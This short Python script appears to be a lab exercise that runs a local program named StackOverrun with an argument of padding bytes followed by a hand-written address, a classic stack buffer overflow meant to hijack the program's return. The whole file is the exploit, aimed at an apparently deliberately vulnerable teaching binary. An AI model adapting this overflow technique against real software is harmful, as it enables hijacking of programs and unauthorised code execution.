import os


arg = "AAAAAAAAAAAAAAAAAA\x21\x12\x40"
cmd = "./StackOverrun " + arg;
os.system(cmd)